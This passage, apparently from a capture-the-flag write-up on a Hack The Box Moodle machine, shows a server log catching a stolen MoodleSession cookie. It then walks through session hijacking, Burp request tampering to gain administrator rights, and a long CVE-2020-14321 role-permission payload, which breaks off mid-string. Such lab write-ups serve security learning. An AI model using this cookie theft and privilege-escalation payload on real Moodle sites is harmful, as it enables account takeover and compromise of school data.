+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line">10.10.10.234 - - [10/Apr/2021 11:52:38] <span class="string">&quot;GET /?MoodleSession=4pot7f8s1sqpobn7bjvidf2s6t HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>insert the cookie and we become ‘manuel phillips’</p>
+<p>we are now teacher</p>
+<p>our id is 24 don’t forget</p>
+<p>Go Maths –&gt; Participants </p>
+<p>enroll user Lianne Carter </p>
+<p>why enroll Lianne Carter ? because she is manager</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://moodle.schooled.htb/teachers.html</span><br></pre></td></tr></table></figure>
+
+<p>capture the request via burp to become manager&#x2F;administrartor</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1916.jpg"></li>
+</ul>
+<p>change id&#x3D;24 and rollassign&#x3D;1</p>
+<p>Forward the Request  and Now we became Administrator</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1917.jpg"></li>
+</ul>
+<p>Then </p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1918.jpg"></li>
+</ul>
+<p>Go Define roles</p>
+<p>Intercept the Request in Burp And Edits all the roles<br>Copy the payload from <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0hvYW5nS2llbjEwMjAvQ1ZFLTIwMjAtMTQzMjE=">CVE-2020-14321<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="built_in">return</span>=manage&amp;resettype=none&amp;shortname=manager&amp;name=&amp;description=&amp;archetype=manager&amp;contextlevel10=0&amp;contextlevel10=1&amp;contextlevel30=0&amp;contextlevel30=1&amp;contextlevel40=0&amp;contextlevel40=1&amp;contextlevel50=0&amp;contextlevel50=1&amp;contextlevel70=0&amp;contextlevel70=1&amp;contextlevel80=0&amp;contextlevel80=1&amp;allowassign%5B%5D=&amp;allowassign%5B%5D=1&amp;allowassign%5B%5D=2&amp;allowassign%5B%5D=3&amp;allowassign%5B%5D=4&amp;allowassign%5B%5D=5&amp;allowassign%5B%5D=6&amp;allowassign%5B%5D=7&amp;allowassign%5B%5D=8&amp;allowoverride%5B%5D=&amp;allowoverride%5B%5D=1&amp;allowoverride%5B%5D=2&amp;allowoverride%5B%5D=3&amp;allowoverride%5B%5D=4&amp;allowoverride%5B%5D=5&amp;allowoverride%5B%5D=6&amp;allowoverride%5B%5D=7&amp;allowoverride%5B%5D=8&amp;allowswitch%5B%5D=&amp;allowswitch%5B%5D=1&amp;allowswitch%5B%5D=2&amp;allowswitch%5B%5D=3&amp;allowswitch%5B%5D=4&amp;allowswitch%5B%5D=5&amp;allowswitch%5B%5D=6&amp;allowswitch%5B%5D=7&amp;allowswitch%5B%5D=8&amp;allowview%5B%5D=&amp;allowview%5B%5D=1&amp;allowview%5B%5D=2&amp;allowview%5B%5D=3&amp;allowview%5B%5D=4&amp;allowview%5B%5D=5&amp;allowview%5B%5D=6&amp;allowview%5B%5D=7&amp;allowview%5B%5D=8&amp;block%2Fadmin_bookmarks%3Amyaddinstance=1&amp;block%2Fbadges%3Amyaddinstance=1&amp;block%2Fcalendar_month%3Amyaddinstance=1&amp;block%2Fcalendar_upcoming%3Amyaddinstance=1&amp;block%2Fcomments%3Amyaddinstance=1&amp;block%2Fcourse_list%3Amyaddinstance=1&amp;block%2Fglobalsearch%3Amyaddinstance=1&amp;block%2Fglossary_random%3Amyaddinstance=1&amp;block%2Fhtml%3Amyaddinstance=1&amp;block%2Flp%3Aaddinstance=1&amp;block%2Flp%3Amyaddinstance=1&amp;block%2Fmentees%3Amyaddinstance=1&amp;block%2Fmnet_hosts%3Amyaddinstance=1&amp;block%2Fmyoverview%3Amyaddinstance=1&amp;block%2Fmyprofile%3Amyaddinstance=1&amp;block%2Fnavigation%3Amyaddinstance=1&amp;block%2Fnews_items%3Amyaddinstance=1&amp;block%2Fonline_users%3Amyaddinstance=1&amp;block%2Fprivate_files%3Amyaddinstance=1&amp;block%2Frecentlyaccessedcourses%3Amyaddinstance=1&amp;block%2Frecentlyaccesseditems%3Amyaddinstance=1&amp;block%2Frss_client%3Amyaddinstance=1&amp;block%2Fsettings%3Amyaddinstance=1&amp;block%2Fstarredcourses%3Amyaddinstance=1&amp;block%2Ftags%3Amyaddinstance=1&amp;block%2Ftimeline%3Amyaddinstance=1&amp;enrol%2Fcategory%3Asynchronised=1&amp;message%2Fairnotifier%3Amanagedevice=1&amp;moodle%2Fanalytics%3Alistowninsights=1&amp;moodle%2Fanalytics%3Amanagemodels=1&amp;moodle%2Fbadges%3Amanageglobalsettings=1&amp;moodle%2Fblog%3Acreate=1&amp;moodle%2Fblog%3Amanageentries=1&amp;moodle%2Fblog%3Amanageexternal=1&amp;moodle%2Fblog%3Asearch=1&amp;moodle%2Fblog%3Aview=1&amp;moodle%2Fblog%3Aviewdrafts=1&amp;moodle%2Fcourse%3Aconfigurecustomfields=1&amp;moodle%2Fcourse%3Arecommendactivity=1&amp;moodle%2Fgrade%3Amanagesharedforms=1&amp;moodle%2Fgrade%3Asharegradingforms=1&amp;moodle%2Fmy%3Aconfigsyspages=1&amp;moodle%2Fmy%3Amanageblocks=1&amp;moodle%2Fportfolio%3Aexport=1&amp;moodle%2Fquestion%3Aconfig=1&amp;moodle%2Frestore%3Acreateuser=1&amp;moodle%2Frole%3Amanage=1&amp;moodle%2Fsearch%3Aquery=1&amp;moodle%2Fsite%3Aconfig=1&amp;moodle%2Fsite%3Aconfigview=1&amp;moodle%2Fsite%3Adeleteanymessage=1&amp;moodle%2Fsite%3Adeleteownmessage=1&amp;moodle%2Fsite%3Adoclinks=1&amp;moodle%2Fsite%3Aforcelanguage=1&amp;moodle%2Fsite%3Amaintenanceaccess=1&amp;moodle%2Fsite%3Amanageallmessaging=1&amp;moodle%2Fsite%3Amessageanyuser=1&amp;moodle%2Fsite%3Amnetlogintoremote=1&amp;moodle%2Fsite%3Areadallmessages=1&amp;moodle%2Fsite%3Asendmessage=1&amp;moodle%2Fsite%3Auploadusers=1&amp;moodle%2Fsite%3Aviewparticipants=1&amp;moodle%2Ftag%3Aedit=1&amp;moodle%2Ftag%3Aeditblocks=1&amp;moodle%2Ftag%3Aflag=1&amp;moodle%2Ftag%3Amanage=1&amp;moodle%2Fuser%3Achangeownpassword=1&amp;moodle%2Fuser%3Acreate=1&amp;moodle%2Fuser%3Adelete=1&amp;moodle%2Fuser%3Aeditownmessageprofile=1&amp;moodle%2Fuser%3Aeditownprofile=1&amp;moodle%2Fuser%3Aignoreuserquota=1&amp;moodle%2Fuser%3Amanageownblocks=1&amp;moodle%2Fuser%3Amanageownfiles=1&amp;moodle%2Fuser%3Amanagesyspages=1&amp;moodle%2Fuser%3Aupdate=1&amp;moodle%2Fwebservice%3Acreatemobiletoken=1&amp;moodle%2Fwebservice%3Acreatetoken=1&amp;moodle%2Fwebservice%3Amanagealltokens=1&amp;quizaccess%2Fseb%3Amanagetemplates=1&amp;report%2Fcourseoverview%3Aview=1&amp;report%2Fperformance%3Aview=1&amp;report%2Fquestioninstances%3Aview=1&amp;report%2Fsecurity%3Aview=1&amp;report%2Fstatus%3Aview=1&amp;tool%2Fcustomlang%3Aedit=1&amp;tool%2Fcustomlang%3Aview=1&amp;tool%2Fdataprivacy%3Amanagedataregistry=1&amp;tool%2Fdataprivacy%3Amanagedatarequests=1&amp;tool%2Fdataprivacy%3Arequestdeleteforotheruser=1&amp;tool%2Flpmigrate%3Aframeworksmigrate=1&amp;tool%2Fmonitor%3Amanagetool=1&amp;tool%2Fpolicy%3Aaccept=1&amp;tool%2Fpolicy%3Amanagedocs=1&amp;tool%2Fpolicy%3Aviewacceptances=1&amp;tool%2Fuploaduser%3Auploaduserpictures=1&amp;tool%2Fusertours%3Amanagetours=1&amp;auth%2Foauth2%3Amanagelinkedlogins=1&amp;moodle%2Fbadges%3Amanageownbadges=1&amp;moodle%2Fbadges%3Aviewotherbadges=1&amp;moodle%2Fcompetency%3Aevidencedelete=1&amp;moodle%2Fcompetency%3Aplancomment=1&amp;moodle%2Fcompetency%3Aplancommentown=1&amp;moodle%2Fcompetency%3Aplanmanage=1&amp;moodle%2Fcompetency%3Aplanmanagedraft=1&amp;moodle%2Fcompetency%3Aplanmanageown=1&amp;moodle%2Fcompetency%3Aplanmanageowndraft=1&amp;moodle%2Fcompetency%3Aplanrequestreview=1&amp;moodle%2Fcompetency%3Aplanrequestreviewown=1&amp;moodle%2Fcompetency%3Aplanreview=1&amp;moodle%2Fcompetency%3Aplanview=1&amp;moodle%2Fcompetency%3Aplanviewdraft=1&amp;moodle%2Fcompetency%3Aplanviewown=1&amp;moodle%2Fcompetency%3Aplanviewowndraft=1&amp;moodle%2Fcompetency%3Ausercompetencycomment=1&amp;moodle%2Fcompetency%3Ausercompetencycommentown=1&amp;moodle%2Fcompetency%3Ausercompetencyrequestreview=1&amp;moodle%2Fcompetency%3Ausercompetencyrequestreviewown=1&amp;moodle%2Fcompetency%3Ausercompetencyreview=1&amp;moodle%2Fcompetency%3Ausercompetencyview=1&amp;moodle%2Fcompetency%3Auserevidencemanage=1&amp;moodle%2Fcompetency%3Auserevidencemanageown=0&amp;moodle%2Fcompetency%3Auserevidenceview=1&amp;moodle%2Fuser%3Aeditmessageprofile=1&amp;moodle%2Fuser%3Aeditprofile=1&amp;moodle%2Fuser%3Amanageblocks=1&amp;moodle%2Fuser%3Areaduserblogs=1&amp;moodle%2Fuser%3Areaduserposts=1&amp;moodle%2Fuser%3Aviewalldetails=1&amp;moodle%2Fuser%3Aviewlastip=1&amp;moodle%2Fuser%3Aviewuseractivitiesreport=1&amp;report%2Fusersessions%3Amanageownsessions=1&amp;tool%2Fdataprivacy%3Adownloadallrequests=1&amp;tool%2Fdataprivacy%3Adownloadownrequest=1&amp;tool%2Fdataprivacy%3Amakedatadeletionrequestsforchildren=1&amp;tool%2Fdataprivacy%3Amakedatarequestsforchildren=1&amp;tool%2Fdataprivacy%3Arequestdelete=1&amp;tool%2Fpolicy%3Aacceptbehalf=1&amp;moodle%2Fcategory%3Amanage=1&amp;moodle%2Fcategory%3Aviewcourselist=1&amp;moodle%2Fcategory%3Aviewhiddencategories=1&amp;moodle%2Fcohort%3Aassign=1&amp;moodle%2Fcohort%3Amanage=1&amp;moodle%2Fcompetency%3Acompetencymanage=1&amp;moodle%2Fcompetency%3Acompetencyview=1&amp;moodle%2Fcompetency%3Atemplatemanage=1&amp;moodle%2Fcompetency%3Atemplateview=1&amp;moodle%2Fcourse%3Acreate=1&amp;moodle%2Fcourse%3Arequest=1&amp;moodle%2Fsite%3Aapprovecourse=1&amp;repository%2Fcontentbank%3Aaccesscoursecategorycontent=1&amp;repository%2Fcontentbank%3Aaccessgeneralcontent=1&amp;block%2Frecent_activity%3Aviewaddupdatemodule=1&amp;block%2Frecent_activity%3Aviewdeletemodule=1&amp;contenttype%2Fh5p%3Aaccess=1&amp;contenttype%2Fh5p%3Aupload=1&amp;contenttype%2Fh5p%3Auseeditor=1&amp;enrol%2Fcategory%3Aconfig=1&amp;enrol%2Fcohort%3Aconfig=1&amp;enrol%2Fcohort%3Aunenrol=1&amp;enrol%2Fdatabase%3Aconfig=1&amp;enrol%2Fdatabase%3Aunenrol=1&amp;enrol%2Fflatfile%3Amanage=1&amp;enrol%2Fflatfile%3Aunenrol=1&amp;enrol%2Fguest%3Aconfig=1&amp;enrol%2Fimsenterprise%3Aconfig=1&amp;enrol%2Fldap%3Amanage=1&amp;enrol%2Flti%3Aconfig=1&amp;enrol%2Flti%3Aunenrol=1&amp;enrol%2Fmanual%3Aconfig=1&amp;enrol%2Fmanual%3Aenrol=1&amp;enrol%2Fmanual%3Amanage=1&amp;enrol%2Fmanual%3Aunenrol=1&amp;enrol%2Fmanual%3Aunenrolself=1&amp;enrol%2Fmeta%3Aconfig=1&amp;enrol%2Fmeta%3Aselectaslinked=1&amp;enrol%2Fmeta%3Aunenrol=1&amp;enrol%2Fmnet%3Aconfig=1&amp;enrol%2Fpaypal%3Aconfig=1&amp;enrol%2Fpaypal%3Amanage=1&amp;enrol%2Fpaypal%3Aunenrol=1&amp;enrol%2Fpaypal%3Aunenrolself=1&amp;enrol%2Fself%3Aconfig=1&amp;enrol%2Fself%3Aholdkey=1&amp;enrol%2Fself%3Amanage=1&amp;enrol%2Fself%3Aunenrol=1&amp;enrol%2Fself%3Aunenrolself=1&amp;gradeexport%2Fods%3Apublish=1&amp;gradeexport%2Fods%3Aview=1&amp;gradeexport%2Ftxt%3Apublish=1&amp;gradeexport%2Ftxt%3Aview=1&amp;gradeexport%2Fxls%3Apublish=1&amp;gradeexport%2Fxls%3Aview=1&amp;gradeexport%2Fxml%3Apublish=1&amp;gradeexport%2Fxml%3Aview=1&amp;gradeimport%2Fcsv%3Aview=1&amp;gradeimport%2Fdirect%3Aview=1&amp;gradeimport%2Fxml%3Apublish=1&amp;gradeimport%2Fxml%3Aview=1&amp;gradereport%2Fgrader%3Aview=1&amp;gradereport%2Fhistory%3Aview=1&amp;gradereport%2Foutcomes%3Aview=1&amp;gradereport%2Foverview%3Aview=1&amp;gradereport%2Fsingleview%3Aview=1&amp;gradereport%2Fuser%3Aview=1&amp;mod%2Fassign%3Aaddinstance=1&amp;mod%2Fassignment%3Aaddinstance=1&amp;mod%2Fbook%3Aaddinstance=1&amp;mod%2Fchat%3Aaddinstance=1&amp;mod%2Fchoice%3Aaddinstance=1&amp;mod%2Fdata%3Aaddinstance=1&amp;mod%2Ffeedback%3Aaddinstance=1&amp;mod%2Ffolder%3Aaddinstance=1&amp;mod%2Fforum%3Aaddinstance=1&amp;mod%2Fglossary%3Aaddinstance=1&amp;mod%2Fh5pactivity%3Aaddinstance=1&amp;mod%2Fimscp%3Aaddinstance=1&amp;mod%2Flabel%3Aaddinstance=1&amp;mod%2Flesson%3Aaddinstance=1&amp;mod%2Flti%3Aaddcoursetool=1&amp;mod%2Flti%3Aaddinstance=1&amp;mod%2Flti%3Aaddmanualinstance=1&amp;mod%2Flti%3Aaddpreconfiguredinstance=1&amp;mod%2Flti%3Arequesttooladd=1&amp;mod%2Fpage%3Aaddinstance=1&amp;mod%2Fquiz%3Aaddinstance=1&amp;mod%2Fresource%3Aaddinstance=1&amp;mod%2Fscorm%3Aaddinstance=1&amp;mod%2Fsurvey%3Aaddinstance=1&amp;mod%2Furl%3Aaddinstance=1&amp;mod%2Fwiki%3Aaddinstance=1&amp;mod%2Fworkshop%3Aaddinstance=1&amp;moodle%2Fanalytics%3Alistinsights=1&amp;moodle%2Fbackup%3Aanonymise=1&amp;moodle%2Fbackup%3Abackupcourse=1&amp;moodle%2Fbackup%3Abackupsection=1&amp;moodle%2Fbackup%3Abackuptargetimport=1&amp;moodle%2Fbackup%3Aconfigure=1&amp;moodle%2Fbackup%3Adownloadfile=1&amp;moodle%2Fbackup%3Auserinfo=1&amp;moodle%2Fbadges%3Aawardbadge=1&amp;moodle%2Fbadges%3Aconfigurecriteria=1&amp;moodle%2Fbadges%3Aconfiguredetails=1&amp;moodle%2Fbadges%3Aconfiguremessages=1&amp;moodle%2Fbadges%3Acreatebadge=1&amp;moodle%2Fbadges%3Adeletebadge=1&amp;moodle%2Fbadges%3Aearnbadge=1&amp;moodle%2Fbadges%3Arevokebadge=1&amp;moodle%2Fbadges%3Aviewawarded=1&amp;moodle%2Fbadges%3Aviewbadges=1&amp;moodle%2Fcalendar%3Amanageentries=1&amp;moodle%2Fcalendar%3Amanagegroupentries=1&amp;moodle%2Fcalendar%3Amanageownentries=1&amp;moodle%2Fcohort%3Aview=1&amp;moodle%2Fcomment%3Adelete=1&amp;moodle%2Fcomment%3Apost=1&amp;moodle%2Fcomment%3Aview=1&amp;moodle%2Fcompetency%3Acompetencygrade=1&amp;moodle%2Fcompetency%3Acoursecompetencygradable=1&amp;moodle%2Fcompetency%3Acoursecompetencymanage=1&amp;moodle%2Fcompetency%3Acoursecompetencyview=1&amp;moodle%2Fcontentbank%3Aaccess=1&amp;moodle%2Fcontentbank%3Adeleteanycontent=1&amp;moodle%2Fcontentbank%3Adeleteowncontent=1&amp;moodle%2Fcontentbank%3Amanageanycontent=1&amp;moodle%2Fcontentbank%3Amanageowncontent=1&amp;moodle%2Fcontentbank%3Aupload=1&amp;moodle%2Fcontentbank%3Auseeditor=1&amp;moodle%2Fcourse%3Abulkmessaging=1&amp;moodle%2Fcourse%3Achangecategory=1&amp;moodle%2Fcourse%3Achangefullname=1&amp;moodle%2Fcourse%3Achangeidnumber=1&amp;moodle%2Fcourse%3Achangelockedcustomfields=1&amp;moodle%2Fcourse%3Achangeshortname=1&amp;moodle%2Fcourse%3Achangesummary=1&amp;moodle%2Fcourse%3Acreategroupconversations=1&amp;moodle%2Fcourse%3Adelete=1&amp;moodle%2Fcourse%3Aenrolconfig=1&amp;moodle%2Fcourse%3Aenrolreview=1&amp;moodle%2Fcourse%3Aignorefilesizelimits=1&amp;moodle%2Fcourse%3Aisincompletionreports=1&amp;moodle%2Fcourse%3Amanagefiles=1&amp;moodle%2Fcourse%3Amanagegroups=1&amp;moodle%2Fcourse%3Amanagescales=1&amp;moodle%2Fcourse%3Amarkcomplete=1&amp;moodle%2Fcourse%3Amovesections=1&amp;moodle%2Fcourse%3Aoverridecompletion=1&amp;moodle%2Fcourse%3Arenameroles=1&amp;moodle%2Fcourse%3Areset=1&amp;moodle%2Fcourse%3Areviewotherusers=1&amp;moodle%2Fcourse%3Asectionvisibility=1&amp;moodle%2Fcourse%3Asetcurrentsection=1&amp;moodle%2Fcourse%3Asetforcedlanguage=1&amp;moodle%2Fcourse%3Atag=1&amp;moodle%2Fcourse%3Aupdate=1&amp;moodle%2Fcourse%3Auseremail=1&amp;moodle%2Fcourse%3Aview=1&amp;moodle%2Fcourse%3Aviewhiddencourses=1&amp;moodle%2Fcourse%3Aviewhiddensections=1&amp;moodle%2Fcourse%3Aviewhiddenuserfields=1&amp;moodle%2Fcourse%3Aviewparticipants=1&amp;moodle%2Fcourse%3Aviewscales=1&amp;moodle%2Fcourse%3Aviewsuspendedusers=1&amp;moodle%2Fcourse%3Avisibility=1&amp;moodle%2Ffilter%3Amanage=1&amp;moodle%2Fgrade%3Aedit=1&amp;moodle%2Fgrade%3Aexport=1&amp;moodle%2Fgrade%3Ahide=1&amp;moodle%2Fgrade%3Aimport=1&amp;moodle%2Fgrade%3Alock=1&amp;moodle%2Fgrade%3Amanage=1&amp;moodle%2Fgrade%3Amanagegradingforms=1&amp;moodle%2Fgrade%3Amanageletters=1&amp;moodle%2Fgrade%3Amanageoutcomes=1&amp;moodle%2Fgrade%3Aunlock=1&amp;moodle%2Fgrade%3Aview=1&amp;moodle%2Fgrade%3Aviewall=1&amp;moodle%2Fgrade%3Aviewhidden=1&amp;moodle%2Fnotes%3Amanage=1&amp;moodle%2Fnotes%3Aview=1&amp;moodle%2Fquestion%3Aadd=1&amp;moodle%2Fquestion%3Aeditall=1&amp;moodle%2Fquestion%3Aeditmine=1&amp;moodle%2Fquestion%3Aflag=1&amp;moodle%2Fquestion%3Amanagecategory=1&amp;moodle%2Fquestion%3Amoveall=1&amp;moodle%2Fquestion%3Amovemine=1&amp;moodle%2Fquestion%3Atagall=1&amp;moodle%2Fquestion%3Atagmine=1&amp;moodle%2Fquestion%3Auseall=1&amp;moodle%2Fquestion%3Ausemine=1&amp;moodle%2Fquestion%3Aviewall=1&amp;moodle%2Fquestion%3Aviewmine=1&amp;moodle%2Frating%3Arate=1&amp;moodle%2Frating%3Aview=1&amp;moodle%2Frating%3Aviewall=1&amp;moodle%2Frating%3Aviewany=1&amp;moodle%2Frestore%3Aconfigure=1&amp;moodle%2Frestore%3Arestoreactivity=1&amp;moodle%2Frestore%3Arestorecourse=1&amp;moodle%2Frestore%3Arestoresection=1&amp;moodle%2Frestore%3Arestoretargetimport=1&amp;moodle%2Frestore%3Arolldates=1&amp;moodle%2Frestore%3Auploadfile=1&amp;moodle%2Frestore%3Auserinfo=1&amp;moodle%2Frestore%3Aviewautomatedfilearea=1&amp;moodle%2Frole%3Aassign=1&amp;moodle%2Frole%3Aoverride=1&amp;moodle%2Frole%3Areview=1&amp;moodle%2Frole%3Asafeoverride=1&amp;moodle%2Frole%3Aswitchroles=1&amp;moodle%2Fsite%3Aviewreports=1&amp;moodle%2Fuser%3Aloginas=1&amp;moodle%2Fuser%3Aviewdetails=1&amp;moodle%2Fuser%3Aviewhiddendetails=1&amp;report%2Fcompletion%3Aview=1&amp;report%2Flog%3Aview=1&amp;report%2Flog%3Aviewtoday=1&amp;report%2Floglive%3Aview=1&amp;report%2Foutline%3Aview=1&amp;report%2Foutline%3Aviewuserreport=1&amp;report%2Fparticipation%3Aview=1&amp;report%2Fprogress%3Aview=1&amp;report%2Fstats%3Aview=1&amp;repository%2Fcontentbank%3Aaccesscoursecontent=1&amp;tool%2Fmonitor%3Amanagerules=1&amp;tool%2Fmonitor%3Asubscribe=1&amp;tool%2Frecyclebin%3Adeleteitems=1&amp;tool%2Frecyclebin%3Arestoreitems=1&amp;tool%2Frecyclebin%3Aviewitems=1&amp;webservice%2Frest%3Ause=1&amp;webservice%2Fsoap%3Ause=1&amp;webservice%2Fxmlrpc%3Ause=1&amp;atto%2Fh5p%3Aaddembed=1&amp;atto%2Frecordrtc%3Arecordaudio=1&amp;atto%2Frecordrtc%3Arecordvideo=1&amp;booktool%2Fexportimscp%3Aexport=1&amp;booktool%2Fimporthtml%3Aimport=1&amp;booktool%2Fprint%3Aprint=1&amp;forumreport%2Fsummary%3Aview=1&amp;forumreport%2Fsummary%3Aviewall=1&amp;mod%2Fassign%3Aeditothersubmission=1&amp;mod%2Fassign%3Aexportownsubmission=1&amp;mod%2Fassign%3Agrade=1&amp;mod%2Fassign%3Agrantextension=1&amp;mod%2Fassign%3Amanageallocations=1&amp;mod%2Fassign%3Amanagegrades=1&amp;mod%2Fassign%3Amanageoverrides=1&amp;mod%2Fassign%3Areceivegradernotifications=1&amp;mod%2Fassign%3Areleasegrades=1&amp;mod%2Fassign%3Arevealidentities=1&amp;mod%2Fassign%3Areviewgrades=1&amp;mod%2Fassign%3Ashowhiddengrader=1&amp;mod%2Fassign%3Asubmit=1&amp;mod%2Fassign%3Aview=1&amp;mod%2Fassign%3Aviewblinddetails=1&amp;mod%2Fassign%3Aviewgrades=1&amp;mod%2Fassignment%3Aexportownsubmission=1&amp;mod%2Fassignment%3Agrade=1&amp;mod%2Fassignment%3Asubmit=1&amp;mod%2Fassignment%3Aview=1&amp;mod%2Fbook%3Aedit=1&amp;mod%2Fbook%3Aread=1&amp;mod%2Fbook%3Aviewhiddenchapters=1&amp;mod%2Fchat%3Achat=1&amp;mod%2Fchat%3Adeletelog=1&amp;mod%2Fchat%3Aexportparticipatedsession=1&amp;mod%2Fchat%3Aexportsession=1&amp;mod%2Fchat%3Areadlog=1&amp;mod%2Fchat%3Aview=1&amp;mod%2Fchoice%3Achoose=1&amp;mod%2Fchoice%3Adeleteresponses=1&amp;mod%2Fchoice%3Adownloadresponses=1&amp;mod%2Fchoice%3Areadresponses=1&amp;mod%2Fchoice%3Aview=1&amp;mod%2Fdata%3Aapprove=1&amp;mod%2Fdata%3Acomment=1&amp;mod%2Fdata%3Aexportallentries=1&amp;mod%2Fdata%3Aexportentry=1&amp;mod%2Fdata%3Aexportownentry=1&amp;mod%2Fdata%3Aexportuserinfo=1&amp;mod%2Fdata%3Amanagecomments=1&amp;mod%2Fdata%3Amanageentries=1&amp;mod%2Fdata%3Amanagetemplates=1&amp;mod%2Fdata%3Amanageuserpresets=1&amp;mod%2Fdata%3Arate=1&amp;mod%2Fdata%3Aview=1&amp;mod%2Fdata%3Aviewallratings=1&amp;mod%2Fdata%3Aviewalluserpresets=1&amp;mod%2Fdata%3Aviewanyrating=1&amp;mod%2Fdata%3Aviewentry=1&amp;mod%2Fdata%3Aviewrating=1&amp;mod%2Fdata%3Awriteentry=1&amp;mod%2Ffeedback%3Acomplete=1&amp;mod%2Ffeedback%3Acreateprivatetemplate=1&amp;mod%2Ffeedback%3Acreatepublictemplate=1&amp;mod%2Ffeedback%3Adeletesubmissions=1&amp;mod%2Ffeedback%3Adeletetemplate=1&amp;mod%2Ffeedback%3Aedititems=1&amp;mod%2Ffeedback%3Amapcourse=1&amp;mod%2Ffeedback%3Areceivemail=1&amp;mod%2Ffeedback%3Aview=1&amp;mod%2Ffeedback%3Aviewanalysepage=1&amp;mod%2Ffeedback%3Aviewreports=1&amp;mod%2Ffolder%3Amanagefiles=1&amp;mod%2Ffolder%3Aview=1&amp;mod%2Fforum%3Aaddnews=1&amp;mod%2Fforum%3Aaddquestion=1&amp;mod%2Fforum%3Aallowforcesubscribe=1&amp;mod%2Fforum%3Acanoverridecutoff=1&amp;mod%2Fforum%3Acanoverridediscussionlock=1&amp;mod%2Fforum%3Acanposttomygroups=1&amp;mod%2Fforum%3Acantogglefavourite=1&amp;mod%2Fforum%3Acreateattachment=1&amp;mod%2Fforum%3Adeleteanypost=1&amp;mod%2Fforum%3Adeleteownpost=1&amp;mod%2Fforum%3Aeditanypost=1&amp;mod%2Fforum%3Aexportdiscussion=1&amp;mod%2Fforum%3Aexportforum=1&amp;mod%2Fforum%3Aexportownpost=1&amp;mod%2Fforum%3Aexportpost=1&amp;mod%2Fforum%3Agrade=1&amp;mod%2Fforum%3Amanagesubscriptions=1&amp;mod%2Fforum%3Amovediscussions=1&amp;mod%2Fforum%3Apindiscussions=1&amp;mod%2Fforum%3Apostprivatereply=1&amp;mod%2Fforum%3Apostwithoutthrottling=1&amp;mod%2Fforum%3Arate=1&amp;mod%2Fforum%3Areadprivatereplies=1&amp;mod%2Fforum%3Areplynews=1&amp;mod%2Fforum%3Areplypost=1&amp;mod%2Fforum%3Asplitdiscussions=1&amp;mod%2Fforum%3Astartdiscussion=1&amp;mod%2Fforum%3Aviewallratings=1&amp;mod%2Fforum%3Aviewanyrating=1&amp;mod%2Fforum%3Aviewdiscussion=1&amp;mod%2Fforum%3Aviewhiddentimedposts=1&amp;mod%2Fforum%3Aviewqandawithoutposting=1&amp;mod%2Fforum%3Aviewrating=1&amp;mod%2Fforum%3Aviewsubscribers=1&amp;mod%2Fglossary%3Aapprove=1&amp;mod%2Fglossary%3Acomment=1&amp;mod%2Fglossary%3Aexport=1&amp;mod%2Fglossary%3Aexportentry=1&amp;mod%2Fglossary%3Aexportownentry=1&amp;mod%2Fglossary%3Aimport=1&amp;mod%2Fglossary%3Amanagecategories=1&amp;mod%2Fglossary%3Amanagecomments=1&amp;mod%2Fglossary%3Amanageentries=1&amp;mod%2Fglossary%3Arate=1&amp;mod%2Fglossary%3Aview=1&amp;mod%2Fglossary%3Aviewallratings=1&amp;mod%2Fglossary%3Aviewanyrating=1&amp;mod%2Fglossary%3Aviewrating=1&amp;mod%2Fglossary%3Awrite=1&amp;mod%2Fh5pactivity%3Areviewattempts=1&amp;mod%2Fh5pactivity%3Asubmit=1&amp;mod%2Fh5pactivity%3Aview=1&amp;mod%2Fimscp%3Aview=1&amp;mod%2Flabel%3Aview=1&amp;mod%2Flesson%3Aedit=1&amp;mod%2Flesson%3Agrade=1&amp;mod%2Flesson%3Amanage=1&amp;mod%2Flesson%3Amanageoverrides=1&amp;mod%2Flesson%3Aview=1&amp;mod%2Flesson%3Aviewreports=1&amp;mod%2Flti%3Aadmin=1&amp;mod%2Flti%3Amanage=1&amp;mod%2Flti%3Aview=1&amp;mod%2Fpage%3Aview=1&amp;mod%2Fquiz%3Aattempt=1&amp;mod%2Fquiz%3Adeleteattempts=1&amp;mod%2Fquiz%3Aemailconfirmsubmission=1&amp;mod%2Fquiz%3Aemailnotifysubmission=1&amp;mod%2Fquiz%3Aemailwarnoverdue=1&amp;mod%2Fquiz%3Agrade=1&amp;mod%2Fquiz%3Aignoretimelimits=1&amp;mod%2Fquiz%3Amanage=1&amp;mod%2Fquiz%3Amanageoverrides=1&amp;mod%2Fquiz%3Apreview=1&amp;mod%2Fquiz%3Aregrade=1&amp;mod%2Fquiz%3Areviewmyattempts=1&amp;mod%2Fquiz%3Aview=1&amp;mod%2Fquiz%3Aviewreports=1&amp;mod%2Fresource%3Aview=1&amp;mod%2Fscorm%3Adeleteownresponses=1&amp;mod%2Fscorm%3Adeleteresponses=1&amp;mod%2Fscorm%3Asavetrack=1&amp;mod%2Fscorm%3Askipview=1&amp;mod%2Fscorm%3Aviewreport=1&amp;mod%2Fscorm%3Aviewscores=1&amp;mod%2Fsurvey%3Adownload=1&amp;mod%2Fsurvey%3Aparticipate=1&amp;mod%2Fsurvey%3Areadresponses=1&amp;mod%2Furl%3Aview=1&amp;mod%2Fwiki%3Acreatepage=1&amp;mod%2Fwiki%3Aeditcomment=1&amp;mod%2Fwiki%3Aeditpage=1&amp;mod%2Fwiki%3Amanagecomment=1&amp;mod%2Fwiki%3Amanagefiles=1&amp;mod%2Fwiki%3Amanagewiki=1&amp;mod%2Fwiki%3Aoverridelock=1&amp;mod%2Fwiki%3Aviewcomment=1&amp;mod%2Fwiki%3Aviewpage=1&amp;mod%2Fworkshop%3Aallocate=1&amp;mod%2Fworkshop%3Adeletesubmissions=1&amp;mod%2Fworkshop%3Aeditdimensions=1&amp;mod%2Fworkshop%3Aexportsubmissions=1&amp;mod%2Fworkshop%3Aignoredeadlines=1&amp;mod%